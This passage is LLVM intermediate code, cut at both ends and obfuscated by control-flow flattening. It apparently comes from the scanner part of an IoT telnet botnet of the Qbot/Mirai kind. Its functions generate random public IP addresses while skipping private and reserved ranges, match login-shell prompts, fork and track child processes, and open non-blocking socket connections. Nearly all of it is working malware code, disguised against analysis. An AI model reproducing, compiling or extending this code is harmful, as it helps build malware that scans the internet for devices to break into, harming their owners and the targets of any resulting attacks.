  store i32 %82, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  store i32 4, i32* %13, align 4
  %84 = load i32, i32* %6, align 4
  %85 = bitcast i32* %14 to i8*
  %86 = call i32 @getsockopt(i32 %84, i32 1, i32 4, i8* %85, i32* %13) #5
  %87 = load i32, i32* %14, align 4
  %88 = icmp ne i32 %87, 0
  %89 = select i1 %88, i32 -201878299, i32 1847462430
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -209150099, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  store i32 1864112192, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -209150099, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  store i32 1691442382, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -209150099, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  store i32 -1466117540, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %6, align 4
  %98 = call i32 (i32, i32, ...) @fcntl(i32 %97, i32 3, i8* null)
  %99 = sext i32 %98 to i64
  store i64 %99, i64* %15, align 8
  %100 = load i64, i64* %15, align 8
  %101 = and i64 %100, -2049
  store i64 %101, i64* %15, align 8
  %102 = load i32, i32* %6, align 4
  %103 = load i64, i64* %15, align 8
  %104 = call i32 (i32, i32, ...) @fcntl(i32 %102, i32 4, i64 %103)
  store i32 1, i32* %5, align 4
  store i32 -209150099, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i32, i32* %5, align 4
  ret i32 %106

loopEnd:                                          ; preds = %96, %95, %94, %93, %92, %91, %90, %83, %66, %57, %52, %47, %38, %37, %first, %switchDefault
  br label %loopEntry
}

declare i32 @fcntl(i32, i32, ...) #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #6

declare i32 @connect(i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #6

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #5
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  store i32 %6, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -418340452, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -418340452, label %first
    i32 -1678659492, label %9
    i32 -1870500050, label %11
    i32 923135539, label %19
    i32 789410447, label %26
    i32 -1214567802, label %36
    i32 -1133278272, label %39
    i32 -715124323, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %7 = icmp ule i32 %.reload, 0
  %8 = select i1 %7, i32 -1678659492, i32 -1870500050
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %2, align 4
  store i32 %10, i32* %1, align 4
  store i32 -715124323, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i64, i64* @numpids, align 8
  %13 = add i64 %12, 1
  store i64 %13, i64* @numpids, align 8
  %14 = load i64, i64* @numpids, align 8
  %15 = add i64 %14, 1
  %16 = mul i64 %15, 4
  %17 = call noalias i8* @malloc(i64 %16) #5
  %18 = bitcast i8* %17 to i32*
  store i32* %18, i32** %3, align 8
  store i32 0, i32* %4, align 4
  store i32 923135539, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %4, align 4
  %21 = zext i32 %20 to i64
  %22 = load i64, i64* @numpids, align 8
  %23 = sub i64 %22, 1
  %24 = icmp ult i64 %21, %23
  %25 = select i1 %24, i32 789410447, i32 -1133278272
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i32*, i32** @pids, align 8
  %28 = load i32, i32* %4, align 4
  %29 = zext i32 %28 to i64
  %30 = getelementptr inbounds i32, i32* %27, i64 %29
  %31 = load i32, i32* %30, align 4
  %32 = load i32*, i32** %3, align 8
  %33 = load i32, i32* %4, align 4
  %34 = zext i32 %33 to i64
  %35 = getelementptr inbounds i32, i32* %32, i64 %34
  store i32 %31, i32* %35, align 4
  store i32 -1214567802, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %4, align 4
  %38 = add i32 %37, 1
  store i32 %38, i32* %4, align 4
  store i32 923135539, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %2, align 4
  %41 = load i32*, i32** %3, align 8
  %42 = load i64, i64* @numpids, align 8
  %43 = sub i64 %42, 1
  %44 = getelementptr inbounds i32, i32* %41, i64 %43
  store i32 %40, i32* %44, align 4
  %45 = load i32*, i32** @pids, align 8
  %46 = bitcast i32* %45 to i8*
  call void @free(i8* %46) #5
  %47 = load i32*, i32** %3, align 8
  store i32* %47, i32** @pids, align 8
  %48 = load i32, i32* %2, align 4
  store i32 %48, i32* %1, align 4
  store i32 -715124323, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %1, align 4
  ret i32 %50

loopEnd:                                          ; preds = %39, %36, %26, %19, %11, %9, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @fork() #3

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.113, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #9
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  %switchVar = alloca i32
  store i32 1303207560, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1303207560, label %11
    i32 1208139509, label %18
    i32 -1370191173, label %19
    i32 -288236863, label %24
    i32 -1215590686, label %37
    i32 -1473722678, label %50
    i32 -1224666538, label %63
    i32 642939266, label %75
    i32 -1511638844, label %76
    i32 -1984987879, label %78
    i32 1803840995, label %81
    i32 1160743512, label %100
    i32 464884048, label %101
    i32 -124464133, label %102
    i32 1467925780, label %105
    i32 -593703048, label %106
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #9
  %16 = icmp ult i64 %13, %15
  %17 = select i1 %16, i32 1208139509, i32 1467925780
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  store i32 -1370191173, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %5, align 4
  %21 = load i32, i32* %7, align 4
  %22 = icmp sgt i32 %20, %21
  %23 = select i1 %22, i32 -288236863, i32 -1511638844
  store i32 %23, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %3, align 8
  %26 = load i32, i32* %5, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds i8, i8* %25, i64 %27
  %29 = load i32, i32* %7, align 4
  %30 = sext i32 %29 to i64
  %31 = sub i64 0, %30
  %32 = getelementptr inbounds i8, i8* %28, i64 %31
  %33 = load i8, i8* %32, align 1
  %34 = sext i8 %33 to i32
  %35 = icmp eq i32 %34, 0
  %36 = select i1 %35, i32 642939266, i32 -1215590686
  store i32 %36, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i8*, i8** %3, align 8
  %39 = load i32, i32* %5, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = sub i64 0, %43
  %45 = getelementptr inbounds i8, i8* %41, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 32
  %49 = select i1 %48, i32 642939266, i32 -1473722678
  store i32 %49, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %3, align 8
  %52 = load i32, i32* %5, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i32, i32* %7, align 4
  %56 = sext i32 %55 to i64
  %57 = sub i64 0, %56
  %58 = getelementptr inbounds i8, i8* %54, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp eq i32 %60, 13
  %62 = select i1 %61, i32 642939266, i32 -1224666538
  store i32 %62, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i8*, i8** %3, align 8
  %65 = load i32, i32* %5, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i8, i8* %64, i64 %66
  %68 = load i32, i32* %7, align 4
  %69 = sext i32 %68 to i64
  %70 = sub i64 0, %69
  %71 = getelementptr inbounds i8, i8* %67, i64 %70
  %72 = load i8, i8* %71, align 1
  %73 = sext i8 %72 to i32
  %74 = icmp eq i32 %73, 10
  store i32 642939266, i32* %switchVar
  store i1 %74, i1* %.reg2mem
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  store i32 -1511638844, i32* %switchVar
  store i1 %.reload, i1* %.reg2mem2
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %77 = select i1 %.reload3, i32 -1984987879, i32 1803840995
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i32, i32* %7, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %7, align 4
  store i32 -1370191173, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i8*, i8** %3, align 8
  %83 = load i32, i32* %5, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds i8, i8* %82, i64 %84
  %86 = load i32, i32* %7, align 4
  %87 = sext i32 %86 to i64
  %88 = sub i64 0, %87
  %89 = getelementptr inbounds i8, i8* %85, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = sext i8 %90 to i32
  %92 = load i8*, i8** %4, align 8
  %93 = load i32, i32* %6, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8, i8* %92, i64 %94
  %96 = load i8, i8* %95, align 1
  %97 = sext i8 %96 to i32
  %98 = icmp eq i32 %91, %97
  %99 = select i1 %98, i32 1160743512, i32 464884048
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  store i32 1, i32* %2, align 4
  store i32 -593703048, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  store i32 -124464133, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i32, i32* %6, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %6, align 4
  store i32 1303207560, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -593703048, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %2, align 4
  ret i32 %107

loopEnd:                                          ; preds = %105, %102, %101, %100, %81, %78, %76, %75, %63, %50, %37, %24, %19, %18, %11, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %1 = alloca [16 x i8], align 16
  %2 = call i32 @rand() #5
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %5 = call i32 @rand() #5
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %8 = call i32 @rand() #5
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %11 = call i32 @rand() #5
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  %switchVar = alloca i32
  store i32 -1443857834, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1443857834, label %14
    i32 1666538955, label %19
    i32 1514923966, label %24
    i32 -108526466, label %29
    i32 -1750502935, label %34
    i32 -506360196, label %39
    i32 1985019080, label %44
    i32 -551815, label %49
    i32 -1298707634, label %54
    i32 1174611613, label %59
    i32 -1310828023, label %64
    i32 638892043, label %69
    i32 1172316543, label %74
    i32 2125428700, label %79
    i32 927374535, label %84
    i32 1399439090, label %89
    i32 -1837493858, label %94
    i32 -1267497748, label %99
    i32 2104933133, label %104
    i32 1651375770, label %109
    i32 -1584590596, label %114
    i32 -1326815654, label %119
    i32 -312728065, label %124
    i32 2088256853, label %129
    i32 1899397734, label %134
    i32 -345680238, label %139
    i32 -279069946, label %144
    i32 -1405460665, label %149
    i32 -1811472951, label %154
    i32 1094509522, label %158
    i32 1702504579, label %160
    i32 -1571928472, label %173
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %16 = zext i8 %15 to i32
  %17 = icmp eq i32 %16, 0
  %18 = select i1 %17, i32 1094509522, i32 1666538955
  store i32 %18, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %21 = zext i8 %20 to i32
  %22 = icmp eq i32 %21, 10
  %23 = select i1 %22, i32 1094509522, i32 1514923966
  store i32 %23, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %26 = zext i8 %25 to i32
  %27 = icmp eq i32 %26, 100
  %28 = select i1 %27, i32 -108526466, i32 -506360196
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %31 = zext i8 %30 to i32
  %32 = icmp sge i32 %31, 64
  %33 = select i1 %32, i32 -1750502935, i32 -506360196
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %36 = zext i8 %35 to i32
  %37 = icmp sle i32 %36, 127
  %38 = select i1 %37, i32 1094509522, i32 -506360196
  store i32 %38, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %41 = zext i8 %40 to i32
  %42 = icmp eq i32 %41, 127
  %43 = select i1 %42, i32 1094509522, i32 1985019080
  store i32 %43, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %46 = zext i8 %45 to i32
  %47 = icmp eq i32 %46, 169
  %48 = select i1 %47, i32 -551815, i32 -1298707634
  store i32 %48, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %51 = zext i8 %50 to i32
  %52 = icmp eq i32 %51, 254
  %53 = select i1 %52, i32 1094509522, i32 -1298707634
  store i32 %53, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %56 = zext i8 %55 to i32
  %57 = icmp eq i32 %56, 172
  %58 = select i1 %57, i32 1174611613, i32 638892043
  store i32 %58, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %61 = zext i8 %60 to i32
  %62 = icmp sle i32 %61, 16
  %63 = select i1 %62, i32 -1310828023, i32 638892043
  store i32 %63, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %66 = zext i8 %65 to i32
  %67 = icmp sle i32 %66, 31
  %68 = select i1 %67, i32 1094509522, i32 638892043
  store i32 %68, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %71 = zext i8 %70 to i32
  %72 = icmp eq i32 %71, 192
  %73 = select i1 %72, i32 1172316543, i32 927374535
  store i32 %73, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 0
  %78 = select i1 %77, i32 2125428700, i32 927374535
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %81 = zext i8 %80 to i32
  %82 = icmp eq i32 %81, 2
  %83 = select i1 %82, i32 1094509522, i32 927374535
  store i32 %83, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %86 = zext i8 %85 to i32
  %87 = icmp eq i32 %86, 192
  %88 = select i1 %87, i32 1399439090, i32 -1267497748
  store i32 %88, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  %90 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %91 = zext i8 %90 to i32
  %92 = icmp eq i32 %91, 88
  %93 = select i1 %92, i32 -1837493858, i32 -1267497748
  store i32 %93, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %96 = zext i8 %95 to i32
  %97 = icmp eq i32 %96, 99
  %98 = select i1 %97, i32 1094509522, i32 -1267497748
  store i32 %98, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %101 = zext i8 %100 to i32
  %102 = icmp eq i32 %101, 192
  %103 = select i1 %102, i32 2104933133, i32 1651375770
  store i32 %103, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %106 = zext i8 %105 to i32
  %107 = icmp eq i32 %106, 168
  %108 = select i1 %107, i32 1094509522, i32 1651375770
  store i32 %108, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  %110 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %111 = zext i8 %110 to i32
  %112 = icmp eq i32 %111, 198
  %113 = select i1 %112, i32 -1584590596, i32 -312728065
  store i32 %113, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %116, 18
  %118 = select i1 %117, i32 1094509522, i32 -1326815654
  store i32 %118, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  %120 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %121 = zext i8 %120 to i32
  %122 = icmp eq i32 %121, 19
  %123 = select i1 %122, i32 1094509522, i32 -312728065
  store i32 %123, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %126 = zext i8 %125 to i32
  %127 = icmp eq i32 %126, 198
  %128 = select i1 %127, i32 2088256853, i32 -345680238
  store i32 %128, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %131 = zext i8 %130 to i32
  %132 = icmp eq i32 %131, 51
  %133 = select i1 %132, i32 1899397734, i32 -345680238
  store i32 %133, i32* %switchVar
  br label %loopEnd

; <label>:134:                                    ; preds = %loopEntry
  %135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %136 = zext i8 %135 to i32
  %137 = icmp eq i32 %136, 100
  %138 = select i1 %137, i32 1094509522, i32 -345680238
  store i32 %138, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %141 = zext i8 %140 to i32
  %142 = icmp eq i32 %141, 203
  %143 = select i1 %142, i32 -279069946, i32 -1811472951
  store i32 %143, i32* %switchVar
  br label %loopEnd

; <label>:144:                                    ; preds = %loopEntry
  %145 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %146 = zext i8 %145 to i32
  %147 = icmp eq i32 %146, 0
  %148 = select i1 %147, i32 -1405460665, i32 -1811472951
  store i32 %148, i32* %switchVar
  br label %loopEnd

; <label>:149:                                    ; preds = %loopEntry
  %150 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %151 = zext i8 %150 to i32
  %152 = icmp eq i32 %151, 113
  %153 = select i1 %152, i32 1094509522, i32 -1811472951
  store i32 %153, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  %155 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %156 = zext i8 %155 to i32
  %157 = icmp sge i32 %156, 224
  store i32 1094509522, i32* %switchVar
  store i1 %157, i1* %.reg2mem
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %159 = select i1 %.reload, i32 1702504579, i32 -1571928472
  store i32 %159, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  %161 = call i32 @rand() #5
  %162 = srem i32 %161, 223
  %163 = trunc i32 %162 to i8
  store i8 %163, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %164 = call i32 @rand() #5
  %165 = srem i32 %164, 255
  %166 = trunc i32 %165 to i8
  store i8 %166, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %167 = call i32 @rand() #5
  %168 = srem i32 %167, 255
  %169 = trunc i32 %168 to i8
  store i8 %169, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %170 = call i32 @rand() #5
  %171 = srem i32 %170, 255
  %172 = trunc i32 %171 to i8
  store i8 %172, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  store i32 -1443857834, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %174 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %174, i8 0, i64 16, i32 16, i1 false)
  %175 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %176 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %177 = zext i8 %176 to i32
  %178 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %179 = zext i8 %178 to i32
  %180 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %181 = zext i8 %180 to i32
  %182 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  %183 = zext i8 %182 to i32
  %184 = call i32 (i8*, i8*, ...) @szprintf(i8* %175, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.114, i32 0, i32 0), i32 %177, i32 %179, i32 %181, i32 %183)
  %185 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %186 = call i32 @inet_addr(i8* %185) #5
  ret i32 %186

loopEnd:                                          ; preds = %160, %158, %154, %149, %144, %139, %134, %129, %124, %119, %114, %109, %104, %99, %94, %89, %84, %79, %74, %69, %64, %59, %54, %49, %44, %39, %34, %29, %24, %19, %14, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @rand() #3

; Function Attrs: noinline nounwind uwtable
define i32 @TelnetIPRanges() #0 {
  %1 = alloca [16 x i8], align 16
  %2 = call i32 @rand() #5
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %5 = call i32 @rand() #5
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %8 = call i32 @rand() #5
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 2), align 1
  %11 = call i32 @rand() #5
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 3), align 1
  %switchVar = alloca i32
